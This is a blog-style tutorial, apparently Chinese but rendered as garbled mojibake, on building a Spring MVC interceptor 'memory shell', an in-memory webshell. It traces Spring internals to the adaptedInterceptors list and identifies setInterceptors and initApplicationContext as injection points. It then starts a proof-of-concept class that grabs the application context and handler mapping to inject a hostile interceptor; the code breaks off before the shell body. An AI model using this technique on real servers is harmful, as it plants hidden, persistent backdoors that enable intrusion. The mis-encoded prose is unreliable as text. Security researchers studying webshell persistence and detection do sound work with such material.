<p>é—®é¢˜ï¼š</p>
<ul>
<li>æ„Ÿè§‰æ„é€ çš„æ—¶å€™åªä¼šå»ä¸€å‘³ä»¿ç…§springå»æ„é€ ï¼Œå¯¹ç±»å’Œä»£ç çš„ç†è§£ä¸å¤Ÿï¼Œæ„é€ çš„pocä¹Ÿå¾ˆæ­»æ¿ï¼Œä¸çµæ´»</li>
<li>ç†è§£æŠ¥é”™çš„èƒ½åŠ›å’ŒæŸ¥é˜…çš„èƒ½åŠ›æœ‰å¾…æé«˜</li>
</ul>
<h1 id="interceptorå†…å­˜é©¬">Interceptorå†…å­˜é©¬<a hidden class="anchor" aria-hidden="true" href="#interceptorå†…å­˜é©¬">#</a></h1>
<h2 id="0x01-åˆ†æ">0x01 åˆ†æ<a hidden class="anchor" aria-hidden="true" href="#0x01-åˆ†æ">#</a></h2>
<p>è¿™é‡Œå†™äº†ä¸ªdemo</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example.demo.demos.web</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServletRequest</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServletResponse</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.context.annotation.Configuration</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.servlet.HandlerInterceptor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.servlet.config.annotation.InterceptorRegistry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.servlet.config.annotation.WebMvcConfigurer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@Configuration</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">InterceptorConfig</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">WebMvcConfigurer</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// å®šä¹‰å†…éƒ¨ç±»ä½œä¸ºæ‹¦æˆªå™¨</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">class</span> <span class="nc">MyInterceptor</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">HandlerInterceptor</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">preHandle</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">handler</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// åœ¨è¯·æ±‚å¤„ç†ä¹‹å‰æ‰§è¡Œçš„é€»è¾‘</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;MyInterceptor: åœ¨è¯·æ±‚å¤„ç†ä¹‹å‰æ‰§è¡Œï¼Œè¯·æ±‚è·¯å¾„ï¼š&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getRequestURI</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// è¿™é‡Œå¯ä»¥è¿›è¡Œæƒé™éªŒè¯ç­‰æ“ä½œï¼Œå¦‚æœéªŒè¯ä¸é€šè¿‡å¯ä»¥è¿”å› false ä¸­æ–­è¯·æ±‚å¤„ç†</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//@Override    </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                throws Exception {</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//            // åœ¨è¯·æ±‚å¤„ç†ä¹‹åæ‰§è¡Œçš„é€»è¾‘ï¼ˆä¸å†ä¾èµ–ModelViewContainerï¼‰</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//            System.out.println(&#34;MyInterceptor: åœ¨è¯·æ±‚å¤„ç†ä¹‹åæ‰§è¡Œï¼Œè¯·æ±‚è·¯å¾„ï¼š&#34; + request.getRequestURI());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        }</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">afterCompletion</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">handler</span><span class="p">,</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="n">ex</span><span class="p">)</span><span class="w">  </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// åœ¨æ•´ä¸ªè¯·æ±‚å®Œæˆä¹‹åæ‰§è¡Œçš„é€»è¾‘</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;MyInterceptor: åœ¨æ•´ä¸ªè¯·æ±‚å®Œæˆä¹‹åæ‰§è¡Œï¼Œè¯·æ±‚è·¯å¾„ï¼š&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getRequestURI</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">addInterceptors</span><span class="p">(</span><span class="n">InterceptorRegistry</span><span class="w"> </span><span class="n">registry</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// æ³¨å†Œå†…éƒ¨ç±»å®šä¹‰çš„æ‹¦æˆªå™¨ï¼Œå¹¶æŒ‡å®šæ‹¦æˆªè·¯å¾„</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">registry</span><span class="p">.</span><span class="na">addInterceptor</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">MyInterceptor</span><span class="p">()).</span><span class="na">addPathPatterns</span><span class="p">(</span><span class="s">&#34;/**&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>controllerçš„ä»£ç </p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@RequestMapping</span><span class="p">(</span><span class="s">&#34;/hello&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@ResponseBody</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">hello</span><span class="p">(</span><span class="nd">@RequestParam</span><span class="p">(</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;name&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">defaultValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;unknown user&#34;</span><span class="p">)</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;è¯·æ±‚ä¸­+hello&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;Hello &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>ç„¶åæˆ‘ä»¬è®¿é—®<code>/hello</code>è¿”å›</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">MyInterceptor</span><span class="p">:</span><span class="w"> </span><span class="n">åœ¨è¯·æ±‚å¤„ç†ä¹‹å‰æ‰§è¡Œ</span><span class="err">ï¼Œ</span><span class="n">è¯·æ±‚è·¯å¾„</span><span class="err">ï¼š</span><span class="o">/</span><span class="n">hello</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">è¯·æ±‚ä¸­</span><span class="o">+</span><span class="n">hello</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">MyInterceptor</span><span class="p">:</span><span class="w"> </span><span class="n">åœ¨æ•´ä¸ªè¯·æ±‚å®Œæˆä¹‹åæ‰§è¡Œ</span><span class="err">ï¼Œ</span><span class="n">è¯·æ±‚è·¯å¾„</span><span class="err">ï¼š</span><span class="o">/</span><span class="n">hello</span><span class="w">
</span></span></span></code></pre></div><p>è¯·æ±‚<code>/hello</code>ä¼šè°ƒç”¨<code>preHandle()</code>å’Œ<code>afterCompletion()</code>ä¸­çš„ä»£ç ï¼Œæˆ‘ä»¬å†…å­˜é©¬å°±å¯ä»¥å­˜å‚¨åœ¨è¿™ä¸¤ä¸ªæ–¹æ³•é‡Œï¼Œç„¶åå°±æ˜¯æ’å…¥çš„é—®é¢˜äº†</p>
<p>ä»demoä¹Ÿä¸éš¾å‘ç°æ’å…¥çš„åœ°æ–¹ï¼Œè¿˜æœ‰ä¹‹å‰controllerå†…å­˜é©¬åˆ†æçš„æ—¶å€™æœ‰ä¸ªåœ°æ–¹åº”è¯¥æ˜¯æ’å…¥ç‚¹</p>
<h3 id="æ­£ç‰‡å¼€å§‹">æ­£ç‰‡å¼€å§‹<a hidden class="anchor" aria-hidden="true" href="#æ­£ç‰‡å¼€å§‹">#</a></h3>
<p>è¿™é‡Œè¿˜æ˜¯æŒ‰ç…§å¸¸è§„é€»è¾‘åˆ†æä¸‹å§ï¼Œåœ¨preHandleæ‰“ä¸‹æ–­ç‚¹ï¼Œå¾€å‰çœ‹è°ƒç”¨æ ˆ</p>
<p><img loading="lazy" src="images/image-20241125173514575.png" alt="image-20241125173514575"  />
</p>
<p>çœ‹åˆ°<code>applyPreHandle()</code>è¿™é‡Œä¼šå¾ªç¯è°ƒç”¨<code>HandlerInterceptor</code>çš„<code>preHandle</code>æ–¹æ³•</p>
<p><img loading="lazy" src="images/image-20241125173901283.png" alt="image-20241125173901283"  />
</p>
<p>ç„¶åå†å¾€å‰ï¼Œ<code>mappedHandler</code>æ˜¯getHandler()å¾—åˆ°çš„</p>
<p><img loading="lazy" src="images/image-20241125175247898.png" alt="image-20241125175247898"  />
</p>
<p>ç„¶åå…¶å®å°±æ˜¯ä¹‹å‰åˆ†æcontrolleré‚£ä¸ªåœ°æ–¹ï¼Œè¯å®ä¹‹å‰çš„çŒœæƒ³ï¼Œ<code>getHandler()</code>è·å–mappedHandleræ—¶ä¼šå»è·å–Interceptor</p>
<p>è¿™é‡Œä¼šå¾ªç¯æ·»åŠ <code>this.adaptedInterceptors</code>ä¸­çš„<code>HandlerInterceptor</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ±¡æŸ“è¿™ä¸ªå€¼ï¼Œè¿›è¡Œæ’å…¥æˆ‘ä»¬çš„<code>Interceptorå†…å­˜é©¬</code></p>
<p><img loading="lazy" src="images/image-20241125175732633.png" alt="image-20241125175732633"  />
</p>
<h2 id="0x02-æ„é€ ">0x02 æ„é€ <a hidden class="anchor" aria-hidden="true" href="#0x02-æ„é€ ">#</a></h2>
<p>è¿™é‡Œæ’å…¥ç‚¹æ‰¾åˆ°äº†å°±æ˜¯æ€ä¹ˆæ„é€ äº†ï¼Œè¿™é‡Œæˆ‘ä»¬æŸ¥æ‰¾<code>this.adaptedInterceptors</code>éƒ½æ²¡æœ‰ç›¸å…³çš„æ–¹æ³•ç›´æ¥æ’å…¥ï¼Œä½†æ˜¯æœ‰é—´æ¥çš„</p>
<p><strong><code>AbstractHandlerMapping.java</code></strong></p>
<p><code>initInterceptors()</code>è¿™é‡Œä¼š<code>this.adaptedInterceptors.add(adaptInterceptor(interceptor));</code>æ·»åŠ ï¼Œä½†æ˜¯æ˜¯æ·»åŠ çš„<code>this.interceptors</code>ä¸­çš„å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆå»æ‰¾<code>this.interceptors</code>çš„æ’å…¥æ–¹æ³•</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">initInterceptors</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="na">interceptors</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">interceptors</span><span class="p">.</span><span class="na">size</span><span class="p">();</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="n">Object</span><span class="w"> </span><span class="n">interceptor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">interceptors</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">i</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">interceptor</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">             </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">IllegalArgumentException</span><span class="p">(</span><span class="s">&#34;Entry number &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34; in interceptors array is null&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="k">this</span><span class="p">.</span><span class="na">adaptedInterceptors</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">adaptInterceptor</span><span class="p">(</span><span class="n">interceptor</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><code>setInterceptors()</code>æ–¹æ³•å¯ä»¥æ’å…¥<code>this.interceptors</code></p>
<p>è¿™é‡Œ<code>addAll</code>æ˜¯åŠ å…¥æˆ‘ä»¬çš„<code>interceptors</code>ï¼Œä¸ä¼šè¦†ç›–<code>this.interceptors</code>ä¹‹å‰çš„å€¼ï¼Œæˆ‘ä¹‹å‰è¿˜ä»¥ä¸ºä¼šè¦†ç›–æ‰hh</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setInterceptors</span><span class="p">(</span><span class="n">Object</span><span class="p">...</span><span class="w"> </span><span class="n">interceptors</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="na">interceptors</span><span class="p">.</span><span class="na">addAll</span><span class="p">(</span><span class="n">Arrays</span><span class="p">.</span><span class="na">asList</span><span class="p">(</span><span class="n">interceptors</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>å…¶å®æ‰¾åˆ°ä¸Šé¢ä¸Šä¸ªæ–¹æ³•å°±å¯ä»¥åˆ©ç”¨ï¼Œè¿™é‡Œè¿˜çœ‹åˆ°<code>initApplicationContext()</code>æ–¹æ³•</p>
<blockquote>
<p>è¿™é‡Œå…ˆ<code>é‡ç½®this.adaptedInterceptors</code>ï¼Œç„¶åå†<code>é‡æ–°èµ‹å€¼</code></p>
<p>ä¸ç„¶çš„è¯ï¼Œç›´æ¥è°ƒç”¨ä¸Šé¢æ–¹æ³•ä¼šä½¿<code>åˆ«äººspringè‡ªå·±çš„interceptorså¤šä¸€å€</code></p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">initApplicationContext</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">BeansException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">extendInterceptors</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">interceptors</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">detectMappedInterceptors</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">adaptedInterceptors</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">initInterceptors</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>ç„¶åè¿™é‡Œå¤§æ¦‚é¡ºåºå°±æ˜¯setInterceptorsç„¶åinitApplicationContextå®Œæˆæ’å…¥ï¼Œç„¶åæˆ‘ä»¬æ¥æ„é€ poc</p>
<p>ä½†æ˜¯é™¤äº†è¿™äº›ï¼Œæ„é€ pocè¿˜æœ‰äº›é—®é¢˜éœ€è¦æ€è€ƒã€‚</p>
<h3 id="é—®é¢˜1-abstracthandlermapping">é—®é¢˜1 AbstractHandlerMapping<a hidden class="anchor" aria-hidden="true" href="#é—®é¢˜1-abstracthandlermapping">#</a></h3>
<p>ä¸Šé¢é‚£å‡ ä¸ªæ–¹æ³•éƒ½æ¥è‡ª<code>AbstractHandlerMapping</code>ï¼Œæˆ‘ä»¬æ€ä¹ˆå¾—åˆ°è¿™ä¸ªç±»å‘¢ï¼Œæˆ‘ä»¬è·å–ä¸Šä¸‹æ–‡åå¾—åˆ°çš„æ˜¯<code>RequestMappingHandlerMapping</code>å¯¹è±¡ï¼Œç„¶åæˆ‘çœ‹è¿™ä¸ªç±»çš„å±æ€§å’Œç›¸å…³æ–¹æ³•éƒ½ä¸èƒ½è°ƒç”¨åˆ°<code>AbstractHandlerMapping</code></p>
<p><code>AbstractHandlerMapping</code>æ˜¯æŠ½è±¡ç±»ï¼Œæ‰€ä»¥ä¸Šä¸‹æ–‡è·å–åï¼Œä¸èƒ½åˆ›é€ è¿™ä¸ªçš„å®ä¾‹</p>
<p><img loading="lazy" src="images/image-20241125191209534.png" alt="image-20241125191209534"  />
</p>
<p><strong>è§£å†³ï¼š</strong></p>
<p>ä½†æ˜¯è¿˜æœ‰ä¸ªç‚¹<code>RequestMappingHandlerMapping</code>æ˜¯<code>AbstractHandlerMapping</code>çš„<code>å­ç±»</code></p>
<p><img loading="lazy" src="images/image-20241125191519620.png" alt="image-20241125191519620"  />
</p>
<p>è°ƒç”¨å­ç±»æ²¡æ‰¾æ–¹æ³•æ—¶å°±ä¼šè°ƒç”¨<code>çˆ¶ç±»æ–¹æ³•</code>ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥ç”¨<code>RequestMappingHandlerMapping</code>å¯¹è±¡ï¼</p>
<h3 id="é—®é¢˜2-ç±»å‹">é—®é¢˜2 ç±»å‹<a hidden class="anchor" aria-hidden="true" href="#é—®é¢˜2-ç±»å‹">#</a></h3>
<p><code>setInterceptors()</code>è¿™é‡Œèµ‹å€¼è¦ç»§æ‰¿<code>Interceptor</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">bean.setInterceptors(new Interceptor[]{new Interceptor_demo(&#34;a&#34;)});
</span></span></code></pre></div><p>åœ¨<code>initInterceptors()</code>è¦æ’å…¥æ—¶ä¼šè¿›è¡Œä¸€ä¸ª<strong>ç±»åˆ«è¯†åˆ«åŠè½¬æ¢</strong></p>
<p>æ‰€ä»¥è¿˜è¦ç»§æ‰¿<code>HandlerInterceptor</code></p>
<p><img loading="lazy" src="images/image-20241125183420701.png" alt="image-20241125183420701"  />
</p>
<h2 id="0x03-poc">0x03 poc<a hidden class="anchor" aria-hidden="true" href="#0x03-poc">#</a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example.demo.demos.web</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.aopalliance.intercept.Interceptor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.lang.Nullable</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RequestMapping</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RestController</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.context.WebApplicationContext</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.context.request.RequestContextHolder</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.servlet.HandlerInterceptor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.servlet.ModelAndView</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServletRequest</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServletResponse</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.BufferedReader</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.InputStreamReader</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.PrintWriter</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Method</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@RestController</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Interceptor_demo</span><span class="w">  </span><span class="kd">implements</span><span class="w"> </span><span class="n">HandlerInterceptor</span><span class="p">,</span><span class="n">Interceptor</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@RequestMapping</span><span class="p">(</span><span class="s">&#34;/inter&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">Interceptor_demo</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;main&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">WebApplicationContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">WebApplicationContext</span><span class="p">)</span><span class="w"> </span><span class="n">RequestContextHolder</span><span class="p">.</span><span class="na">currentRequestAttributes</span><span class="p">().</span><span class="na">getAttribute</span><span class="p">(</span><span class="s">&#34;org.springframework.web.servlet.DispatcherServlet.CONTEXT&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">RequestMappingHandlerMapping</span><span class="w"> </span><span class="n">bean</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">context</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
